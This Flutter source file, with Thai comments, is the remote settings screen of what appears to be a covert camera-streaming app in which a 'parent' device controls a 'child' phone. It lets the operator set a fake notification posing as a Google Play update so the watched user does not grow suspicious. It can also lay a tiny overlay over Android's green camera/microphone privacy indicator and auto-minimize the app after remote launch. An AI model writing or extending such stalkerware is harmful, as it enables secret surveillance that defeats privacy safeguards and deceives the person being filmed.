import 'package:flutter/material.dart';
import 'camera_config.dart';
import 'signaling_service.dart';

/// หน้าตั้งค่ารีโมท — แม่ปรับ config ของกล้องลูกได้ผ่าน server
/// - notif title/body: ปลอม Google Play update (หรือข้อความอื่น)
/// - stealth overlay: เปิด/ปิด 1×1 px ทับจุดเขียว
/// - auto-minimize: ย่อแอปอัตโนมัติหลังเปิดกล้อง
class SettingsScreen extends StatefulWidget {
  const SettingsScreen({
    super.key,
    required this.deviceId,
    required this.signalingUrl,
  });

  final String deviceId;
  final String signalingUrl;

  @override
  State<SettingsScreen> createState() => _SettingsScreenState();
}

class _SettingsScreenState extends State<SettingsScreen> {
  late final SignalingService _signaling;
  final _titleCtrl = TextEditingController();
  final _bodyCtrl = TextEditingController();
  bool _stealthOverlay = true;
  bool _autoMinimize = true;

  bool _loading = true;
  bool _saving = false;
  String? _error;

  @override
  void initState() {
    super.initState();
    _signaling = SignalingService(widget.signalingUrl);
    _signaling.connect();
    _fetch();
  }

  Future<void> _fetch() async {
    try {
      final cfg = await _signaling.getConfig(widget.deviceId);
      if (!mounted) return;
      setState(() {
        _titleCtrl.text = cfg.notifTitle;
        _bodyCtrl.text = cfg.notifBody;
        _stealthOverlay = cfg.stealthOverlay;
        _autoMinimize = cfg.autoMinimize;
        _loading = false;
      });
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _error = e.toString();
        _loading = false;
      });
    }
  }

  Future<void> _save() async {
    if (_saving) return;
    final title = _titleCtrl.text.trim();
    final body = _bodyCtrl.text.trim();
    if (title.isEmpty || body.isEmpty) {
      setState(() => _error = 'กรุณากรอกหัวข้อและข้อความให้ครบ');
      return;
    }

    setState(() {
      _saving = true;
      _error = null;
    });

    try {
      final cfg = CameraConfig(
        notifTitle: title,
        notifBody: body,
        stealthOverlay: _stealthOverlay,
        autoMinimize: _autoMinimize,
      );
      await _signaling.updateConfig(widget.deviceId, cfg);
      if (!mounted) return;
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('บันทึกการตั้งค่าแล้ว')),
      );
      Navigator.of(context).pop(true);
    } catch (e) {
      if (!mounted) return;
      setState(() {
        _saving = false;
        _error = e.toString();
      });
    }
  }

  void _resetDefaults() {
    setState(() {
      _titleCtrl.text = CameraConfig.defaults.notifTitle;
      _bodyCtrl.text = CameraConfig.defaults.notifBody;
      _stealthOverlay = CameraConfig.defaults.stealthOverlay;
      _autoMinimize = CameraConfig.defaults.autoMinimize;
    });
  }

  @override
  void dispose() {
    _titleCtrl.dispose();
    _bodyCtrl.dispose();
    _signaling.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    final theme = Theme.of(context);

    return Scaffold(
      appBar: AppBar(
        backgroundColor: theme.colorScheme.inversePrimary,
        title: const Text('ตั้งค่ากล้อง'),
        actions: [
          IconButton(
            tooltip: 'รีเซ็ตค่าเริ่มต้น',
            icon: const Icon(Icons.restart_alt),
            onPressed: _loading || _saving ? null : _resetDefaults,
          ),
        ],
      ),
      body: _loading
          ? const Center(child: CircularProgressIndicator())
          : SingleChildScrollView(
              padding: const EdgeInsets.all(20),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  _sectionTitle('แจ้งเตือนปลอม', Icons.notifications_active),
                  const SizedBox(height: 8),
                  const Text(
                    'ข้อความนี้จะแสดงในแถบแจ้งเตือนตอนกล้องสตรีม — '
                    'ปลอมตัวเป็นแอปอื่นเพื่อไม่ให้ผู้ใช้สงสัย',
                    style: TextStyle(color: Colors.black54, fontSize: 13),
                  ),
                  const SizedBox(height: 12),
                  TextField(
                    controller: _titleCtrl,
                    enabled: !_saving,
                    decoration: const InputDecoration(
                      labelText: 'หัวข้อแจ้งเตือน',
                      hintText: 'เช่น "กำลังอัพเดท Google Play"',
                      border: OutlineInputBorder(),
                    ),
                  ),
                  const SizedBox(height: 12),
                  TextField(
                    controller: _bodyCtrl,
                    enabled: !_saving,
                    maxLines: 2,
                    decoration: const InputDecoration(
                      labelText: 'ข้อความแจ้งเตือน',
                      hintText: 'เช่น "กำลังตรวจสอบและดาวน์โหลดข้อมูล"',
                      border: OutlineInputBorder(),
                    ),
                  ),
                  const SizedBox(height: 28),
                  _sectionTitle('ฟีเจอร์ซ่อนตัว', Icons.visibility_off),
                  const SizedBox(height: 8),
                  SwitchListTile.adaptive(
                    title: const Text('ทับจุดเขียว (กล้อง/ไมค์)'),
                    subtitle: const Text(
                      'แสดง overlay เล็กๆ ทับไอคอน privacy ของ Android '
                      '— ต้องการสิทธิ์ "Display over other apps"',
                    ),
                    value: _stealthOverlay,
                    onChanged: _saving
                        ? null
                        : (v) => setState(() => _stealthOverlay = v),
                  ),
                  SwitchListTile.adaptive(
                    title: const Text('ย่อแอปอัตโนมัติ'),
                    subtitle: const Text(
                      'หลังเปิดกล้องครั้งแรก จะย่อแอปลง home screen ทันที '
                      '(สำหรับโหมด auto-launch จาก FCM)',
                    ),
                    value: _autoMinimize,
                    onChanged:
                        _saving ? null : (v) => setState(() => _autoMinimize = v),
                  ),
                  if (_error != null) ...[
                    const SizedBox(height: 16),
                    Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(
                        color: Colors.red.shade50,
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: Row(
                        children: [
                          const Icon(Icons.error_outline, color: Colors.red),
                          const SizedBox(width: 8),
                          Expanded(
                            child: Text(
                              _error!,
                              style: const TextStyle(color: Colors.red),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                  const SizedBox(height: 24),
                  FilledButton.icon(
                    onPressed: _saving ? null : _save,
                    icon: _saving
                        ? const SizedBox(
                            width: 18,
                            height: 18,
                            child: CircularProgressIndicator(
                              strokeWidth: 2,
                              color: Colors.white,
                            ),
                          )
                        : const Icon(Icons.save),
                    label: Text(_saving ? 'กำลังบันทึก...' : 'บันทึก'),
                    style: FilledButton.styleFrom(
                      minimumSize: const Size(double.infinity, 52),
                    ),
                  ),
                ],
              ),
            ),
    );
  }

  Widget _sectionTitle(String text, IconData icon) => Row(
        children: [
          Icon(icon, size: 20, color: Colors.teal),
          const SizedBox(width: 8),
          Text(
            text,
            style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold),
          ),
        ],
      );
}
